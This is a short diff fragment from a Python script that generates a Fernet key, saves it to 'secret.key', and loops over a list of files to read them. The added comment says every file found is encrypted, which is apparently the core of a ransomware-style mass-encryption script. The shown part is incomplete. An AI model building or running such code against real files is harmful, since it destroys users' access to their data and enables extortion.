@@ -19,6 +19,7 @@ key = Fernet.generate_key()
 with open("secret.key","wb") as secret:
     secret.write(key)
 
+#takes every file found and encrypts them
 for file in files:
     with open(file,"rb") as thefile:
         contents = thefile.read()
